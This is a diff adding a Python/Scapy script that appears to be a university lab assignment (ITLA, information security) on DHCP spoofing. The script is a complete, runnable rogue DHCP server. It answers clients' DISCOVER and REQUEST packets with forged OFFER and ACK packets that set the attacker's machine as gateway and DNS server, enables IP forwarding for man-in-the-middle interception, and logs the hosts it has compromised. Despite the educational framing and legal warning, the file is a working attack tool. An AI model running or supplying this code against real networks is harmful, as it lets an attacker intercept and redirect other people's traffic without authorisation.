@@ -1,0 +1,271 @@
+#!/usr/bin/env python3
+"""
+=============================================================================
+ DHCP SPOOFING - Servidor DHCP Rogue (Educativo / Laboratorio Académico)
+=============================================================================
+ Institución : ITLA – Instituto Tecnológico de las Américas
+ Carrera     : Seguridad de la Información
+ Matrícula   : 20250730
+ Práctica    : Ataque N.° 3 – DHCP Spoofing
+ Red base    : 202.25.73.0/24 (derivada de matrícula 20250730)
+ Entorno     : Laboratorio controlado y autorizado
+
+ ADVERTENCIA: Este script es exclusivamente para fines educativos en
+ entornos de laboratorio controlados. Su uso fuera de un entorno
+ autorizado es ilegal (Ley 53-07, República Dominicana).
+=============================================================================
+"""
+
+import sys
+import os
+import logging
+import ipaddress
+from datetime import datetime
+
+# ── Verificar privilegios root ─────────────────────────────────────────────
+if os.geteuid() != 0:
+    print("[✗] Este script requiere privilegios root. Ejecuta con sudo.")
+    sys.exit(1)
+
+try:
+    from scapy.all import (
+        Ether, IP, UDP, BOOTP, DHCP,
+        sniff, sendp, get_if_hwaddr, conf, RandShort
+    )
+except ImportError:
+    print("[✗] Scapy no está instalado. Ejecuta: sudo pip3 install scapy")
+    sys.exit(1)
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  CONFIGURACIÓN DEL LABORATORIO
+#  Red: 202.25.73.0/24  (matrícula 20250730 → octetos 202.25.73.x)
+# ═══════════════════════════════════════════════════════════════════════════
+IFACE        = "eth0"               # Interfaz de red del atacante
+ATTACKER_IP  = "202.25.73.50"       # IP estática del atacante
+SUBNET_MASK  = "255.255.255.0"
+GATEWAY_ROGUE = "202.25.73.50"      # Gateway falso = IP del atacante (MitM)
+DNS_ROGUE    = "202.25.73.50"       # DNS rogue (también el atacante)
+LEASE_TIME   = 600                  # Segundos de concesión DHCP
+
+# Pool de IPs asignadas por el servidor rogue
+POOL_START   = "202.25.73.201"
+POOL_END     = "202.25.73.220"
+
+# ══════════════════════════════════════════════════════════════════════════
+#  LOGGING
+# ══════════════════════════════════════════════════════════════════════════
+LOG_FILE = "dhcp_spoof.log"
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s  %(levelname)-8s  %(message)s",
+    handlers=[
+        logging.FileHandler(LOG_FILE),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+log = logging.getLogger("DHCP-Spoof")
+
+# ══════════════════════════════════════════════════════════════════════════
+#  POOL DE IPs (generador simple)
+# ══════════════════════════════════════════════════════════════════════════
+_pool = list(
+    ipaddress.IPv4Network(f"202.25.73.0/24", strict=False).hosts()
+)[200:220]  # .201 – .220
+_pool_iter = iter([str(ip) for ip in _pool])
+_leases: dict = {}  # MAC → IP asignada
+
+
+def get_next_ip(client_mac: str) -> str | None:
+    """Devuelve la misma IP si el cliente ya tiene una, o asigna la siguiente del pool."""
+    if client_mac in _leases:
+        return _leases[client_mac]
+    try:
+        ip = next(_pool_iter)
+        _leases[client_mac] = ip
+        return ip
+    except StopIteration:
+        return None
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  CONSTRUCCIÓN DE PAQUETES DHCP
+# ══════════════════════════════════════════════════════════════════════════
+def build_dhcp_offer(discover_pkt) -> Ether | None:
+    """Construye un DHCP OFFER en respuesta a un DISCOVER."""
+    client_mac = discover_pkt[Ether].src
+    xid        = discover_pkt[BOOTP].xid
+    offered_ip = get_next_ip(client_mac)
+
+    if not offered_ip:
+        log.warning("Pool agotado – no se puede ofrecer IP a %s", client_mac)
+        return None
+
+    log.info("[DISCOVER → OFFER]  Cliente MAC=%s  Ofreciendo IP=%s", client_mac, offered_ip)
+
+    offer = (
+        Ether(dst=client_mac, src=get_if_hwaddr(IFACE)) /
+        IP(src=ATTACKER_IP, dst="255.255.255.255") /
+        UDP(sport=67, dport=68) /
+        BOOTP(
+            op=2,           # BOOTREPLY
+            yiaddr=offered_ip,
+            siaddr=ATTACKER_IP,
+            giaddr="0.0.0.0",
+            chaddr=bytes.fromhex(client_mac.replace(":", "")),
+            xid=xid,
+            flags=0
+        ) /
+        DHCP(options=[
+            ("message-type", "offer"),
+            ("server_id",    ATTACKER_IP),
+            ("lease_time",   LEASE_TIME),
+            ("subnet_mask",  SUBNET_MASK),
+            ("router",       GATEWAY_ROGUE),   # ← Gateway rogue (MitM)
+            ("name_server",  DNS_ROGUE),        # ← DNS rogue
+            "end"
+        ])
+    )
+    return offer
+
+
+def build_dhcp_ack(request_pkt) -> Ether | None:
+    """Construye un DHCP ACK en respuesta a un REQUEST."""
+    client_mac = request_pkt[Ether].src
+    xid        = request_pkt[BOOTP].xid
+    assigned_ip = _leases.get(client_mac)
+
+    # Si el REQUEST es para otro servidor, ignorar
+    for opt in request_pkt[DHCP].options:
+        if isinstance(opt, tuple) and opt[0] == "server_id":
+            if opt[1] != ATTACKER_IP:
+                return None
+
+    if not assigned_ip:
+        assigned_ip = get_next_ip(client_mac)
+    if not assigned_ip:
+        return None
+
+    log.info("[REQUEST  → ACK  ]  Cliente MAC=%s  Confirmando IP=%s  GW=%s",
+             client_mac, assigned_ip, GATEWAY_ROGUE)
+
+    ack = (
+        Ether(dst=client_mac, src=get_if_hwaddr(IFACE)) /
+        IP(src=ATTACKER_IP, dst="255.255.255.255") /
+        UDP(sport=67, dport=68) /
+        BOOTP(
+            op=2,
+            yiaddr=assigned_ip,
+            siaddr=ATTACKER_IP,
+            chaddr=bytes.fromhex(client_mac.replace(":", "")),
+            xid=xid,
+            flags=0
+        ) /
+        DHCP(options=[
+            ("message-type", "ack"),
+            ("server_id",    ATTACKER_IP),
+            ("lease_time",   LEASE_TIME),
+            ("subnet_mask",  SUBNET_MASK),
+            ("router",       GATEWAY_ROGUE),   # ← Gateway rogue (MitM)
+            ("name_server",  DNS_ROGUE),        # ← DNS rogue
+            "end"
+        ])
+    )
+    return ack
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  CALLBACK: manejo de cada paquete DHCP recibido
+# ══════════════════════════════════════════════════════════════════════════
+def handle_dhcp_packet(pkt):
+    """Función llamada por sniff() para cada paquete capturado."""
+    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
+        return
+
+    dhcp_type = None
+    for opt in pkt[DHCP].options:
+        if isinstance(opt, tuple) and opt[0] == "message-type":
+            dhcp_type = opt[1]
+            break
+
+    if dhcp_type == 1:       # DISCOVER
+        offer = build_dhcp_offer(pkt)
+        if offer:
+            sendp(offer, iface=IFACE, verbose=False)
+
+    elif dhcp_type == 3:     # REQUEST
+        ack = build_dhcp_ack(pkt)
+        if ack:
+            sendp(ack, iface=IFACE, verbose=False)
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  HABILITACIÓN DE IP FORWARDING (para actuar como gateway MitM)
+# ══════════════════════════════════════════════════════════════════════════
+def enable_ip_forwarding():
+    """Habilita el reenvío de paquetes IP en Linux (necesario para MitM)."""
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+        log.info("IP Forwarding habilitado.")
+    except Exception as e:
+        log.warning("No se pudo habilitar IP Forwarding automáticamente: %s", e)
+        log.warning("Ejecuta manualmente: echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  BANNER
+# ══════════════════════════════════════════════════════════════════════════
+def print_banner():
+    banner = """
+╔══════════════════════════════════════════════════════════════════╗
+║          DHCP SPOOFING – Servidor DHCP Rogue (Educativo)        ║
+║          ITLA – Seguridad de la Información | Mat: 20250730     ║
+╠══════════════════════════════════════════════════════════════════╣
+║  Red        : 202.25.73.0/24                                    ║
+║  Atacante   : 202.25.73.50 (Gateway rogue)                      ║
+║  Pool rogue : 202.25.73.201 – 202.25.73.220                     ║
+║  Interfaz   : {:<52} ║
+║                                                                  ║
+║  ⚠  SOLO PARA USO EN LABORATORIO ACADÉMICO AUTORIZADO           ║
+╚══════════════════════════════════════════════════════════════════╝
+""".format(IFACE)
+    print(banner)
+
+
+# ══════════════════════════════════════════════════════════════════════════
+#  FUNCIÓN PRINCIPAL
+# ══════════════════════════════════════════════════════════════════════════
+def main():
+    print_banner()
+
+    # Suprimir salida de Scapy
+    conf.verb = 0
+
+    # Habilitar IP forwarding para actuar como gateway
+    enable_ip_forwarding()
+
+    log.info("Iniciando servidor DHCP rogue en interfaz '%s'...", IFACE)
+    log.info("Esperando solicitudes DHCP DISCOVER...")
+    log.info("Presiona Ctrl+C para detener.\n")
+
+    try:
+        sniff(
+            iface=IFACE,
+            filter="udp and (port 67 or port 68)",
+            prn=handle_dhcp_packet,
+            store=False
+        )
+    except KeyboardInterrupt:
+        print("\n")
+        log.info("Ataque detenido por el usuario.")
+        log.info("=== Resumen de leases asignados ===")
+        if _leases:
+            for mac, ip in _leases.items():
+                log.info("  MAC: %s  →  IP: %s  (GW rogue: %s)", mac, ip, GATEWAY_ROGUE)
+        else:
+            log.info("  Ningún cliente comprometido durante esta sesión.")
+        log.info("Log guardado en: %s", LOG_FILE)
+
+
+if __name__ == "__main__":
+    main()
